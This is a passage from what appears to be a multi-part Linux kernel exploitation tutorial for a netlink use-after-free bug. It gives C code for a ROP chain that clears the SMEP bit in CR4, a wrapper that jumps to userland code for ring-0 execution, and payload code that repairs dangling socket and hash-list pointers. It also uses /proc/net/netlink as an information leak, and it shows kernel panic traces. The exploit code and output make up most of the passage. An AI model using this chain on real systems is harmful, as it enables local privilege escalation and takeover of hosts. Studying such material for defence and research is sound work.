ret\n0xffffffff811b97bf : pop rbp ; ret\nSince RSP is overwritten while executing the leave instruction, we have\nto make sure that it does not break the chain (i.e. RSP is still\nright).\nAs RSP is overwritten by RBP, we will re-write RBP prior executing\nthose gadgets:\n#define POP_RBP_ADDR              ((uint64_t) 0xffffffff811b97bf)\n#define MOV_RAX_CR4_LEAVE_ADDR    ((uint64_t) 0xffffffff81003009)\n#define MOV_CR4_RDI_LEAVE_ADDR    ((uint64_t) 0xffffffff8100328d)\n#define CR4_TO_RAX() \\\n*stack++ = POP_RBP_ADDR; \\\n*stack   = (unsigned long) stack + 2*8; stack++; \/* skip 0xdeadbeef *\/ \\\n*stack++ = MOV_RAX_CR4_LEAVE_ADDR; \\\n*stack++ = 0xdeadbeef;  \/\/ dummy RBP value!\n#define RDI_TO_CR4() \\\n*stack++ = POP_RBP_ADDR; \\\n*stack   = (unsigned long) stack + 2*8; stack++; \/* skip 0xdeadbeef *\/ \\\n*stack++ = MOV_CR4_RDI_LEAVE_ADDR; \\\n*stack++ = 0xdeadbeef;  \/\/ dummy RBP value!\nWhile executing leave, RSP is pointing to the \"0xdeadbeef\" line which\nwill be \"poped\" into RBP. That is, the next ret instruction will be\nback into our chain!\nClearing SMEP bit\nAs mentioned in the [49]Meeting Supervisor Mode Execution Prevention\nsection, SMEP is enabled when the bit 20 of CR4 is set. That is, we can\nclear it with the following operation:\nCR4 = CR4 & ~(1<<20)\nequivalent to:\nCR4 &= 0xffffffffffefffff\nIn this chain we will use the following gadgets as well as the previous\nROP-chains:\n0xffffffff8130c249 : and rax, rdx ; ret\n0xffffffff813d538d : pop rdx ; ret\n0xffffffff814f118b : mov edi, eax ; dec ecx ; ret\n0xffffffff8139ca54 : mov edx, edi ; dec ecx ; ret\nNOTE: The highest 32-bits of CR4 are \"reserved\", hence zero. That's why\nwe can use 32-bits register gadgets.\nThat is, we disable SMEP with this chain:\n#define AND_RAX_RDX_ADDR          ((uint64_t) 0xffffffff8130c249)\n#define MOV_EDI_EAX_ADDR          ((uint64_t) 0xffffffff814f118b)\n#define MOV_EDX_EDI_ADDR          ((uint64_t) 0xffffffff8139ca54)\n#define SMEP_MASK (~((uint64_t)(1 << 20))) \/\/ 0xffffffffffefffff\n#define DISABLE_SMEP() \\\nCR4_TO_RAX(); \\\n*stack++ = POP_RDI_ADDR; \\\n*stack++ = SMEP_MASK; \\\n*stack++ = MOV_EDX_EDI_ADDR; \\\n*stack++ = AND_RAX_RDX_ADDR; \\\n*stack++ = MOV_EDI_EAX_ADDR; \\\nRDI_TO_CR4();\nstatic void build_rop_chain(uint64_t *stack)\n{\nmemset((void*)stack, 0xaa, 4096);\nSAVE_ESP(&saved_esp);\nSAVE_RBP(&saved_rbp_lo, &saved_rbp_hi);\nDISABLE_SMEP();\n*stack++ = 0; \/\/ force double-fault\n\/\/ FIXME: implement the ROP-chain\n}\nIt is time to test it and check the value of CR4!\n[  223.425209] double fault: 0000 [#1] SMP\n[  223.425745] CPU 0\n[  223.430785] RIP: 0010:[<ffffffff8155ad78>]  [<ffffffff8155ad78>] do_page_faul\nt+0x8\/0xa0\n[  223.430930] RSP: 0018:0000000020000ff8  EFLAGS: 00010002\n[  223.431000] RAX: 00000000000407f0 RBX: 0000000000000001 RCX: 000000008100bb8e\n[  223.431101] RDX: 00000000ffefffff RSI: 0000000000000010 RDI: 0000000020001028\n[  223.431181] RBP: 0000000020001018 R08: 0000000000000000 R09: 00007f4754a57700\n[  223.431279] R10: 00007ffdc1b6e590 R11: 0000000000000206 R12: 0000000000000001\n[  223.431379] R13: ffff88001c9c0ab8 R14: 0000000000000000 R15: 0000000000000000\n[  223.431460] FS:  00007f4755221700(0000) GS:ffff880003200000(0000) knlGS:00000\n00000000000\n[  223.431565] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\n[  223.431638] CR2: 0000000020000fe8 CR3: 000000001a5d8000 CR4: 00000000000407f0\n^--- !\n!!!!\nOoh Yeah! SMEP is now disabled! We can now jump to userland code :-)!\nJumping to Payload's Wrapper\nOne might wonder why we do \"jump to a wrapper\" instead of calling\nuserland function directly. There are three reasons.\nFirst, GCC automatically setup a \"prologue\" and an \"epilogue\" at the\nbeginning\/end of the C function to save\/restore \"non-scratch\"\nregisters. We are not aware of the __attribute__() macro allowing to\nchange this behavior. It also embedded a \"leave\" instruction before\nreturning. Because of this, the stack will be modified.\nThis is an issue because the stack is currently the userland one.\nHowever, if we repair it in the payload, it will be the kernel stack\nagain. That is, it will push data on the userland stack and pop it on\nthe kernel stack. It will mis-align the stack and will mostly lead to\nkernel crash.\nSecondly, we want to restore the stack pointer to the kernel thread\nstack prior calling the payload. In other words, the payload will run\njust like any other kernel code (stack-wise). The only difference being\nthat the code is located in userland.\nSince we have access to userland code now, we won't do it in the ROP\nchain but with inline assembly instead. That is, when the final ret\ninstruction is executed (in the wrapper), the kernel can continue\n\"normal\" execution after the curr->func() arbitrary call primitive\n(i.e. in __wake_up_common()).\nThirdly, we want some \"abstraction\" so the final payload is somehow\n\"agnostic\" of the arbitrary call requirements. With our arbitrary call\nprimitive, it is required that the called function return a non-null\nvalue to reach the break statement. We will do this in the wrapper.\nIn order to do it, we use the following gadgets:\n0xffffffff81004abc : pop rcx ; ret\n0xffffffff8103357c : jmp rcx\nThe jump ROP-chain becomes:\n#define POP_RCX_ADDR              ((uint64_t) 0xffffffff81004abc)\n#define JMP_RCX_ADDR              ((uint64_t) 0xffffffff8103357c)\n#define JUMP_TO(addr) \\\n*stack++ = POP_RCX_ADDR; \\\n*stack++ = (uint64_t) addr; \\\n*stack++ = JMP_RCX_ADDR;\nInvoked with:\nstatic void build_rop_chain(uint64_t *stack)\n{\nmemset((void*)stack, 0xaa, 4096);\nSAVE_ESP(&saved_esp);\nSAVE_RBP(&saved_rbp_lo, &saved_rbp_hi);\nDISABLE_SMEP();\nJUMP_TO(&userland_entry);\n}\nAnd the \"stub\" for the wrapper is:\nextern void userland_entry(void); \/\/ make GCC happy\nstatic __attribute__((unused)) void wrapper(void)\n{\n\/\/ avoid the prologue\n__asm__ volatile( \"userland_entry:\" :: );   \/\/ <----- jump here\n\/\/ FIXME: repair the stack\n\/\/ FIXME: call to \"real\" payload\n\/\/ avoid the epilogue and the \"leave\" instruction\n__asm__ volatile( \"ret\" :: );\n}\nNote that you need to declare userland_entry as external, which\nactually points to a label at the very top of the wrapper, otherwise\nGCC will complain. In addition, we mark the wrapper() function with\n__attribute__((unused)) to avoid some compilation warning.\nRestoring the Stack Pointers and Wrapper Finalization\nRestoring the stack pointers is pretty straightforward as we saved them\nduring the ROP-chain. Note that we only saved the \"32 lowest bits\" of\nRSP. Fortunately, we also stored \"RBP\". Except if the stack frame of\n__wake_up_common() is 4GB large, the \"32 highest bits\" of RSP will be\nthe same from RBP. That is we can restore both of them with:\nrestored_rbp = ((saved_rbp_hi << 32) | saved_rbp_lo);\nrestored_rsp = ((saved_rbp_hi << 32) | saved_esp);\nAs mentioned in the previous section, the arbitrary call primitive also\nrequired that we return a non-zero value. The wrapper becomes:\nstatic volatile uint64_t restored_rbp;\nstatic volatile uint64_t restored_rsp;\nstatic __attribute__((unused)) void wrapper(void)\n{\n\/\/ avoid the prologue\n__asm__ volatile( \"userland_entry:\" :: );\n\/\/ reconstruct original rbp\/rsp\nrestored_rbp = ((saved_rbp_hi << 32) | saved_rbp_lo);\nrestored_rsp = ((saved_rbp_hi << 32) | saved_esp);\n__asm__ volatile( \"movq %0, %%rax\\n\"\n\"movq %%rax, %%rbp\\n\"\n:: \"m\"(restored_rbp)  );\n__asm__ volatile( \"movq %0, %%rax\\n\"\n\"movq %%rax, %%rsp\\n\"\n:: \"m\"(restored_rsp)  );\n\/\/ FIXME: call to \"real\" payload\n\/\/ arbitrary call primitive requires a non-null return value (i.e. non zero RA\nX register)\n__asm__ volatile( \"movq $5555, %%rax\\n\"\n:: );\n\/\/ avoid the epilogue and the \"leave\" instruction\n__asm__ volatile( \"ret\" :: );\n}\nWhen the ret instruction is executed, the kernel thread stack pointer\nas well as RBP are restored. In addition, RAX holds a non-zero value.\nThat is, we will return from curr->func() and the kernel can continue\nits \"normal\" execution.\nEdit the main() code to check if everything went well:\nint main(void)\n{\n\/\/ ... cut ...\n\/\/ trigger the arbitrary call primitive\nprintf(\"[ ] invoking arbitray call primitive...\\n\");\nval = 3535; \/\/ need to be different than zero\nif (_setsockopt(unblock_fd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &val, sizeof(val)\n))\n{\nperror(\"[-] setsockopt\");\ngoto fail;\n}\nprintf(\"[+] arbitrary call succeed!\\n\");\nPRESS_KEY();\n\/\/ ... cut ...\n}\nIf we run, we should have:\n...\n[+] reallocation succeed! Have fun :-)\n[ ] invoking arbitray call primitive...\n[+] arbitrary call succeed!\n[ ] press key to continue...\n<<< KERNEL CRASH HERE >>>\nPerfect, the kernel now crashes during exit (just like in part 2)! It\nmeans the stack has been properly restored.\nCalling the Payload\nIn order to be done with the wrapper, let's call the payload. For\ndebugging purpose only, we will simply call panic() for now:\n\/\/ kernel function symbols\n#define PANIC_ADDR ((void*) 0xffffffff81553684)\ntypedef void (*panic)(const char *fmt, ...);\nstatic void payload(void)\n{\n((panic)(PANIC_ADDR))(\"HELLO FROM USERLAND\");  \/\/ called from kernel land\n}\nEdit the wrapper() function:\nstatic __attribute__((unused)) void wrapper(void)\n{\n\/\/ avoid the prologue\n__asm__ volatile( \"userland_entry:\" :: );\n\/\/ reconstruct original rbp\/rsp\nrestored_rbp = ((saved_rbp_hi << 32) | saved_rbp_lo);\nrestored_rsp = ((saved_rbp_hi << 32) | saved_esp);\n__asm__ volatile( \"movq %0, %%rax\\n\"\n\"movq %%rax, %%rbp\\n\"\n:: \"m\"(restored_rbp)  );\n__asm__ volatile( \"movq %0, %%rax\\n\"\n\"movq %%rax, %%rsp\\n\"\n:: \"m\"(restored_rsp)  );\nuint64_t ptr = (uint64_t) &payload;           \/\/ <----- HERE\n__asm__ volatile( \"movq %0, %%rax\\n\"\n\"call *%%rax\\n\"\n:: \"m\"(ptr) );\n\/\/ arbitrary call primitive requires a non-null return value (i.e. non zero RA\nX register)\n__asm__ volatile( \"movq $5555, %%rax\\n\"\n:: );\n\/\/ avoid the epilogue and the \"leave\" instruction\n__asm__ volatile( \"ret\" :: );\n}\nNow, if we launch the exploit we get the following trace:\n[ 1394.774972] Kernel panic - not syncing: HELLO FROM USERLAND      \/\/ <-----\n[ 1394.775078] Pid: 2522, comm: exploit\n[ 1394.775200] Call Trace:\n[ 1394.775342]  [<ffffffff8155372b>] ? panic+0xa7\/0x179\n[ 1394.775465]  [<ffffffff81553684>] ? panic+0x0\/0x179              \/\/ <-----\n[ 1394.775583]  [<ffffffff81061909>] ? __wake_up_common+0x59\/0x90   \/\/ <-----\n[ 1394.775749]  [<ffffffff810665a8>] ? __wake_up+0x48\/0x70\n[ 1394.775859]  [<ffffffff814b81cc>] ? netlink_setsockopt+0x13c\/0x1c0\n[ 1394.776022]  [<ffffffff81475a2f>] ? sys_setsockopt+0x6f\/0xc0\n[ 1394.776167]  [<ffffffff8100b1a2>] ? system_call_fastpath+0x16\/0x1b\nAwesome! Since we restored both the kernel stack pointer (thread stack)\nand the stack frame pointer, we get a \"clean\" call trace. In addition,\nwe see the \"HELLO FROM USERLAND\" message, meaning that we definitely\ncontrol the kernel flow of execution. In other words, we have arbitrary\ncode execution in Ring-0 and we can write our payload in C language (no\nneed to ROP anymore).\nWe are almost done with the exploit but two things remain:\n1. Repair the kernel (mandatory)\n2. Fun & Profit (optional)\n__________________________________________________________________\nRepair the Kernel\n\"Yesterday you said tomorrow... So just DO IT!\"\nIn the previous section, we successfully exploit our arbitrary call\nprimitive to gain a fully arbitrary code execution in ring-0 where we\ncan write our final payload in C. In this section, we will use it to\nrepair the kernel. Note that this step is not optional as our exploit\nis still crashing the kernel upon exit.\nAs mentioned in [50]part 3, we need to fix all dangling pointers\nintroduced by the exploit. Fortunately, we already enumerated them in\nthe previous part:\n* the sk pointer in the struct socket associated to unblock_fd file\ndescriptor\n* pointers in the nl_table hash list\nFixing the struct socket\nIn the \"Core Concept #1\" (cf. [51]part 1), we introduced the\nrelationship between a file descriptor and its associated\n(\"specialized\") file:\nCore Structure Relationship core struct relationship\nWhat we need to fix here is the pointer between struct socket and\nstruct sock (i.e. the sk field).\nRemember that we crashed during exit because of UAFs in\nnetlink_release()?\nstatic int netlink_release(struct socket *sock)\n{\nstruct sock *sk = sock->sk;\nstruct netlink_sock *nlk;\nif (!sk)\nreturn 0;                 \/\/ <----- hit this!\nnetlink_remove(sk);\n\/\/ ... cut ...\nAs we can see, if sk is NULL the whole code will be skipped. In other\nwords, repairing the broken struct socket can be done with:\ncurrent->files->fdt->fd[unblock_fd]->private_data->sk = NULL;\n^ struct socket\n^ struct file\n^ struct file **\n^ struct files_struct\n^ struct task_struct\n^--- struct task_struct *\nNOTE: We use unblock_fd here as the other file descriptors have been\nclosed during the exploitation. This is the same fd used to invoke the\narbitrary call primitive.\nThat is, we need:\n1. the value of the current pointer\n2. the offsets of all of the aforementioned structures\nIt is important to only reset this pointer and let the kernel do the\n\"normal\" housekeeping (decrement refcounter, release objects, etc.). It\nprevents memory leaks!\nFor instance, we could only reset the fdt entry to NULL as we did with\nSystemTap (i.e. current->files->fdt->fdt[unblock_fd] = NULL) but this\nwould introduce memory leaks on file, socket, inode and potentially\nother objects.\nAlright, we saw in [52]part 3 how to do kernel structure \"mimicking\".\nHowever, those are the big boys (especially task_struct and file). That\nis, we will be a bit lazier and only define the necessary fields while\nusing hardcoded offsets:\n#define TASK_STRUCT_FILES_OFFSET (0x770) \/\/ [include\/linux\/sched.h]\n#define FILES_STRUCT_FDT_OFFSET (0x8) \/\/ [include\/linux\/fdtable.h]\n#define FDT_FD_OFFSET (0x8) \/\/ [include\/linux\/fdtable.h]\n#define FILE_STRUCT_PRIVATE_DATA_OFFSET (0xa8)\n#define SOCKET_SK_OFFSET (0x38)\nstruct socket {\nchar pad[SOCKET_SK_OFFSET];\nvoid *sk;\n};\nstruct file {\nchar pad[FILE_STRUCT_PRIVATE_DATA_OFFSET];\nvoid *private_data;\n};\nstruct fdtable {\nchar pad[FDT_FD_OFFSET];\nstruct file **fd;\n};\nstruct files_struct {\nchar pad[FILES_STRUCT_FDT_OFFSET];\nstruct fdtable *fdt;\n};\nstruct task_struct {\nchar pad[TASK_STRUCT_FILES_OFFSET];\nstruct files_struct *files;\n};\nNOTE: We already saw in part 3 how to extract offsets from disassembly.\nSearch a code dereferencing a particular field and note the offset\nused.\nBefore writing the repairing payload, we are missing one thing: the\ncurrent pointer value. If you read the \"Core Concept #4\", you should\nknow that the kernel uses the task field of the thread_info structure\nto retrieve it.\nIn addition, we know that we can retrieve the thread_info by masking\nANY kernel thread stack pointer. We have the latter, as we saved and\nrestored RSP. That is, we will use the following macro:\nstruct thread_info {\nstruct task_struct  *task;\nchar pad[0];\n};\n#define THREAD_SIZE (4096 << 2)\n#define get_thread_info(thread_stack_ptr) \\\n((struct thread_info*) (thread_stack_ptr & ~(THREAD_SIZE - 1)))\n#define get_current(thread_stack_ptr) \\\n((struct task_struct*) (get_thread_info(thread_stack_ptr)->task))\nIn the end, the payload() function becomes:\nstatic void payload(void)\n{\nstruct task_struct *current = get_current(restored_rsp);\nstruct socket *sock = current->files->fdt->fd[unblock_fd]->private_data;\nvoid *sk;\nsk = sock->sk; \/\/ keep it for later use\nsock->sk = NULL; \/\/ fix the 'sk' dangling pointer\n}\nIt really looks like \"normal\" kernel code isn't it?\nNow, let's launch the exploit:\n$ .\/exploit\n...\n[ ] invoking arbitrary call primitive...\n[+] arbitrary call succeed!\n[+] exploit complete!\n$                                           \/\/ <----- no crash!\nPerfect, the kernel doesn't crash upon exit anymore! BUT, we are not\ndone yet!\nNow, try to run this command:\n$ cat \/proc\/net\/netlink\n<<< KERNEL CRASH >>>\n[ 1392.097743] BUG: unable to handle kernel NULL pointer dereference at 00000000\n00000438\n[ 1392.137715] IP: [<ffffffff814b70e8>] netlink_seq_next+0xe8\/0x120\n[ 1392.148010] PGD 1cc62067 PUD 1b2df067 PMD 0\n[ 1392.148240] Oops: 0000 [#1] SMP\n...\n[ 1393.022706]  [<ffffffff8155adae>] ? do_page_fault+0x3e\/0xa0\n[ 1393.023509]  [<ffffffff81558055>] ? page_fault+0x25\/0x30\n[ 1393.024298]  [<ffffffff814b70e8>] ? netlink_seq_next+0xe8\/0x120        \/\/ <--\n-- the culprit\n[ 1393.024914]  [<ffffffff811e8e7b>] ? seq_read+0x26b\/0x410\n[ 1393.025574]  [<ffffffff812325ae>] ? proc_reg_read+0x7e\/0xc0\n[ 1393.026268]  [<ffffffff811c0a65>] ? vfs_read+0xb5\/0x1a0\n[ 1393.026920]  [<ffffffff811c1d86>] ? fget_light_pos+0x16\/0x50\n[ 1393.027665]  [<ffffffff811c0e61>] ? sys_read+0x51\/0xb0\n[ 1393.028446]  [<ffffffff8100b1a2>] ? system_call_fastpath+0x16\/0x1b\nDoh :-( A NULL pointer dereference... Yup, the kernel is still in an\nunstable state as we didn't repair all dangling pointers. In other\nwords, we do not crash when the exploit is complete, yet a time bomb is\nticking. Which leads us to the next section.\nFixing the nl_table hash list\nFixing this one is actually trickier than it looks because it uses hash\nlist that brings two issues:\n* The hlist_head type uses a single \"first\" pointer (i.e. this is not\ncircular)\n* Elements are stored in various buckets and forcing \"adjacency\" can\nbe tedious\nIn addition, the Netlink implementation uses a \"dilution\" mechanism\nduring insertion which mess things up. Let's see how we can repair it!\nNOTE: Netlink uses hash tables to quickly retrieve a struct sock from a\npid (cf. netlink_lookup()). We already saw one usage with\nnetlink_getsockbypid() called by netlink_unicast() (cf. part 2).\nFixing a Corrupted List\nIn this section, we will see how to fix a corrupted doubly-linked list\nin general. We assume at this point that we already have arbitrary code\nexecution (hence arbitrary read\/write).\nA normal list looks like this:\nNormal List list_normal.png\nNow, suppose we free and then reallocate the middle element. Since we\ndon't know its original \"next\" and \"prev\" pointer, the list is\ncorrupted. In addition, the adjacent elements have dangling pointers:\nList After Reallocation list_after_realloc.png\nWith such list, it is not possible to do several operations (like\nwalking the list) as it will lead to bad dereferences (and mostly a\ncrash).\nFrom here, we can do various things. First we can try to fix the\nreallocated element next\/prev pointer, so the list just looks like the\noriginal one. Or, we can try to put our reallocated element out of the\nlist (i.e. the adjacent elements point to each other):\nList Jump Over list_jump_over.png\nBoth choices imply that we know the addresses of the adjacent elements.\nNow, let's suppose that we don't actually know these addresses (even\nwith arbitrary read). Are we screwed? Nope!\nThe idea is to use \"guard\" elements before\/after the reallocation\nelement that we control. As they still have a dangling pointer after\nreallocation, removing them from the list will actually \"fix up\" our\nreallocation element without knowing any address (unroll the list_del()\ncode to convince yourself):\nList Removing Guard list_guard_del.png\nOf course, we can now use a classical list_del() on the reallocated\nelement here to completely remove it from the list which is repaired\nnow.\nThat is, the technique imposes two constraints:\n1. We setup one or two adjacent \"guard\" elements\n2. We can remove those guards from the list at will\nAs we will see in the next sections, having 1) in our context is a bit\ntricky (because of hash function and the \"dilute\" mechanism). In the\nexploit, we will use a \"hybrid\" approach (stay tune).\nLost in Space\nIf you haven't read the sections about Netlink data structures and the\nassociated algorithms in Core Concepts #4, it might be the time to get\nback to it.\nLet's identify the dangling pointers in the nl_table hash list (the\nones we need to repair).\nAfter the reallocation, the next and pprev fields of our \"fake\nnetlink_sock\" holds junk data. In addition the \"original\" previous\nand\/or next elements of the bucket list have dangling pointers.\nThe strategy we will use to repair the corrupted hash list is to\nrestore the next\/pprev values of our reallocated element and then do a\n__hlist_del() operation to fix the dangling pointers.\nHowever...\nCorrupted nl_table nl_table_dangling.png\nThat's right, the elements succeeding our reallocation are \"lost in\nspace\". What does that even mean? There is nothing pointing to it\nanymore. The \"only link\" that existed has been overwritten by the\nreallocation. And yet, we need to repair its pprev pointer! All of this\nbecause the hash list are NOT circular. That's tough...\nBefore going back to this issue, let's solve the \"pprev\" pointer of our\nfake netlink_sock. This is not a big deal:\n1. Find the NETLINK_USERSOCK hash table with nl_table (exported\nsymbol)\n2. Find the correct bucket by replaying the hash function using the\noriginal pid (i.e. not MAGIC_NL_PID) and the rnd value of the hash\ntable\n3. Walk the bucket list until we find our reallocated element while\nsaving the address of the previous element\n4. Fix the \"pprev\" value\nNote that 3) implies that we know the address of our reallocated\nelement. We actually do! It is stored in the sk field in the socket\nstructure. Moreover, the next pointer (hlist_node) is the very first\nfield of a netlink_sock. In other words, its address is the same as sk.\nThat's why we save it before overwriting it with NULL (cf. Fixing the\nstruct socket).\nWARNING: 2) implies that the hash table hasn't been diluted. We will\nsee how to minimize the risk.\nOne problem fixed!\nWe Need A Friend: Information Leak\nIn the previous section, we saw that we can fix the pprev pointer of\nour reallocated element by walking the bucket list. We still need to\nrestore the next pointer prior calling __hlist_del(). However we don't\nknow where to make it point as the only link to the \"next\" element has\nbeen overwritten during the reallocation. So, what can we do?\nAt the very least, we can scan the whole memory to retrieve every\nnetlink_sock object. Remember, the SLAB keeps track of partial\/full\nslabs. That is, we can scan the kmalloc-1024 slabs, check that those\nobjects are sockets (with f_ops field) of type netlink_sock (e.g.\nprivate_data->sock->ops == &netlink_ops) with protocol\nNETLINK_USERSOCK, etc. Then, we can check that one of these objects has\nits pprev field pointing to our reallocated element. It will work, but\nscanning the memory can take a lot of time. Please note that sometimes\n(depending on your exploit) it is the only way to fix the kernel!\nNOTE: it can be harder to do it on a system using SLUB as it doesn't\nkeep track of \"full\" slabs. You will need to retrieve them by parsing\nthe struct page, etc.\nInstead, what we will try to do here is to setup a \"guard\" element that\nis located just after our reallocated element. That is, we can retrieve\nits address with the help of the file descriptor table (just like we\ndid with our reallocated element).\nAlas, this is not that easy:\n1. we cannot predict in which bucket an element will land because of\nthe hash function\n2. elements are inserted at the head of a bucket list (i.e. we can't\nput it \"after\")\nBecause of 2), the guard element should be inserted prior our\ntarget\/reallocated element. But how to deal with 1)?\nMaybe, the hash function is \"reversible\"? Don't think so... Remember,\nthe hash function uses a pid and the hash->rnd values. The later is\nunknown before exploiting the bug.\nThe solution is to actually create a lot of netlink sockets (similar to\nspraying). Chances are that two of our sockets will be adjacent in a\nbucket list. But then, how to detect it?\nIn this kind of situation, where you are missing something, you need a\nfriend: an information leak.\nThe Linux kernel has a lot of information leak of various kinds. Some\ncomes from a bug and some are \"legitimates\". We will use the latter. In\nparticular, there is a location that is full of them: the proc file\nsystem.\nNOTE: The proc fs is a pseudo file system which only exists in memory\nand is used to get information from the kernel and\/or set system-wide\nsettings. The API used to manipulate them is seq_file. Please read the\n[53]SeqFileHowTo to have a better understanding.\nProcFS to The Rescue!\nMore specifically, we will use \/proc\/net\/netlink which is still (at the\ntime of writing) world-readable. The aforementioned proc fs file is\ncreated here:\nstatic int __net_init netlink_net_init(struct net *net)\n{\n#ifdef CONFIG_PROC_FS\nif (!proc_net_fops_create(net, \"netlink\", 0, &netlink_seq_fops))\nreturn -ENOMEM;\n#endif\nreturn 0;\n}\nAnd uses the following callbacks:\nstatic const struct seq_operations netlink_seq_ops = {\n.start  = netlink_seq_start,\n.next   = netlink_seq_next,   \/\/ <----- this\n.stop   = netlink_seq_stop,\n.show   = netlink_seq_show,   \/\/ <----- this\n};\nA typical output is:\n$ cat \/proc\/net\/netlink\nsk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks     Drops\nffff88001eb47800 0   0      00000000 0        0        (null) 2        0\nffff88001fa66800 6   0      00000000 0        0        (null) 2        0\n...\nWow! It even leaks kernel pointers! Each line being printed by\nnetlink_seq_show():\nstatic int netlink_seq_show(struct seq_file *seq, void *v)\n{\nif (v == SEQ_START_TOKEN)\nseq_puts(seq,\n\"sk       Eth Pid    Groups   \"\n\"Rmem     Wmem     Dump     Locks     Drops\\n\");\nelse {\nstruct sock *s = v;\nstruct netlink_sock *nlk = nlk_sk(s);\nseq_printf(seq, \"%p %-3d %-6d %08x %-8d %-8d %p %-8d %-8d\\n\", \/\/ <-----\nVULNERABILITY (patched)\ns,\ns->sk_protocol,\nnlk->pid,\nnlk->groups ? (u32)nlk->groups[0] : 0,\nsk_rmem_alloc_get(s),\nsk_wmem_alloc_get(s),\nnlk->cb,\natomic_read(&s->sk_refcnt),\natomic_read(&s->sk_drops)\n);\n}\nreturn 0;\n}\nThe format string of seq_printf() uses %p instead of %pK to dump the\nsock's address. Note that this vulnerability has already been fixed\nwith the help of [54]kptr_restrict. With the \"K\" modifier, the address\nprinted will be 0000000000000000 for normal users. Let's assume that is\nthe case. What other things can we get with this file?\nLet's have a look to netlink_seq_next() which is in charge to select\nthe next netlink_sock that will be printed:\nstatic void *netlink_seq_next(struct seq_file *seq, void *v, loff_t *pos)\n{\nstruct sock *s;\nstruct nl_seq_iter *iter;\nint i, j;\n\/\/ ... cut ...\ndo {\nstruct nl_pid_hash *hash = &nl_table[i].hash;\nfor (; j <= hash->mask; j++) {\ns = sk_head(&hash->table[j]);\nwhile (s && sock_net(s) != seq_file_net(seq))\ns = sk_next(s);                         \/\/ <----- NULL-deref'ed\nhere (\"cat \/proc\/net\/netlink\")\nif (s) {\niter->link = i;\niter->hash_idx = j;\nreturn s;\n}\n}\nj = 0;\n} while (++i < MAX_LINKS);\n\/\/ ... cut ...\n}\nThat is, it walks every hash tables from 0 to MAX_LINKS. Then, for each\ntable, it walks every bucket from 0 to hash->mask. And finally, for\neach bucket, it walks from the first element to the last.\nIn other words, it prints elements \"in order\". Can you see it coming?\n:-)\nThe Solution\nLet's suppose we have created a lot of netlink sockets. By scanning\nthis procfs file we can know if two of our netlink sockets are\n\"adjacent\". This is the information leak we were lacking!\nBEWARE! If we see two of our netlink sockets printed one after the\nother does NOT mean they are actually adjacent.\nIt either means that:\n1. they are adjacent OR\n2. the first element is the last element of a bucket and the second\nelement is the first element of ANOTHER bucket\nNOTE: For the rest of this article we will call the first element the\ntarget and the second element the guard.\nSo, if we are in the first case, removing the guard element will fix up\nthe next field of our target (cf. Fixing a Corrupted List). In the\nsecond case, removing the guard will actually do nothing to our target.\nWhat do we know about the last element in a hash list? The next pointer\nis NULL. That is, we can set the value of the next pointer of our\ntarget to NULL during the reallocation. If we were in the second case,\nthe next pointer would then be \"already\" fixed. But, guess what...\nThe next pointer is the FIRST field of netlink_sock and is the ONLY\nfield that we DO NOT CONTROL with our reallocation primitive... It\nmatches the cmsg_len which is 1024 in our case (cf. [55]part 3).\nDuring the bucket list walking (which deref next pointers), it is\nexpected that the next field of last element is set to NULL. However,\nit is 1024 in our case. That is, the kernel tries to dereference it but\nany dereference below the mmap_min_addr limit provokes a NULL-deref.\nThat's why we are crashing with \"cat \/proc\/net\/netlink\".\nNOTE: You can retrieve this value with \/proc\/sys\/vm\/mmap_min_addr which\nis something like 0x10000.\nNote that we provoked the crash here (on purpose), yet this crash can\noccur whenever our target's bucket list is walked. In particular,\nanother application using NETLINK_USERSOCK may generate a crash by\ninserting an element in our bucket list (i.e. collision). Things get\neven worse if a \"dilution\" happens as every bucket list is walked in\norder to re-insert all elements. We definitely need to fix this!\nWell, this is actually pretty simple... just need to reset our\nreallocation next pointer to NULL during kernel reparation if we are in\nthe first scenario.\nIn the end, considering we have setup and released a \"guard\" element,\nfixing the hash table can be done as follows:\n1. Retrieve the NETLINK_USERSOCK's hash table\n2. Replay the nl_pid_hashfn() hash function to retrieve our target's\nbucket list\n3. Walk the bucket list while keeping a \"prev\" pointer until we find\nour target\n4. Inspect the \"next\" pointer of our target. If it is 1024, we are in\nthe first scenario, just reset it to NULL. Otherwise, do nothing,\nthe guard element already fixed us\n5. Fix our target's \"pprev\" field\n6. Do a __hlist_del() operation to fix the bucket's list (hence the\ndangling pointers)\n7. Stop walking\nAlright, let's implement it:\n\/\/ kernel function symbols\n#define NL_PID_HASHFN         ((void*) 0xffffffff814b6da0)\n#define NETLINK_TABLE_GRAB    ((void*) 0xffffffff814b7ea0)\n#define NETLINK_TABLE_UNGRAB  ((void*) 0xffffffff814b73e0)\n#define NL_TABLE_ADDR         ((void*) 0xffffffff824528c0)\nstruct hlist_node {\nstruct hlist_node *next, **pprev;\n};\nstruct hlist_head {\nstruct hlist_node *first;\n};\nstruct nl_pid_hash {\nstruct hlist_head* table;\nuint64_t rehash_time;\nuint32_t mask;\nuint32_t shift;\nuint32_t entries;\nuint32_t max_shift;\nuint32_t rnd;\n};\nstruct netlink_table {\nstruct nl_pid_hash hash;\nvoid* mc_list;\nvoid* listeners;\nuint32_t nl_nonroot;\nuint32_t groups;\nvoid* cb_mutex;\nvoid* module;\nuint32_t registered;\n};\ntypedef void (*netlink_table_grab_func)(void);\ntypedef void (*netlink_table_ungrab_func)(void);\ntypedef struct hlist_head* (*nl_pid_hashfn_func)(struct nl_pid_hash *hash, uint3\n2_t pid);\n#define netlink_table_grab() \\\n(((netlink_table_grab_func)(NETLINK_TABLE_GRAB))())\n#define netlink_table_ungrab() \\\n(((netlink_table_ungrab_func)(NETLINK_TABLE_UNGRAB))())\n#define nl_pid_hashfn(hash, pid) \\\n(((nl_pid_hashfn_func)(NL_PID_HASHFN))(hash, pid))\nstatic void payload(void)\n{\nstruct task_struct *current = get_current(restored_rsp);\nstruct socket *sock = current->files->fdt->fd[unblock_fd]->private_data;\nvoid *sk;\nsk = sock->sk; \/\/ keep it for list walking\nsock->sk = NULL; \/\/ fix the 'sk' dangling pointer\n\/\/ lock all hash tables\nnetlink_table_grab();\n\/\/ retrieve NETLINK_USERSOCK's hash table\nstruct netlink_table *nl_table = * (struct netlink_table**)NL_TABLE_ADDR; \/\/ d\neref it!\nstruct nl_pid_hash *hash = &(nl_table[NETLINK_USERSOCK].hash);\n\/\/ retrieve the bucket list\nstruct hlist_head *bucket = nl_pid_hashfn(hash, 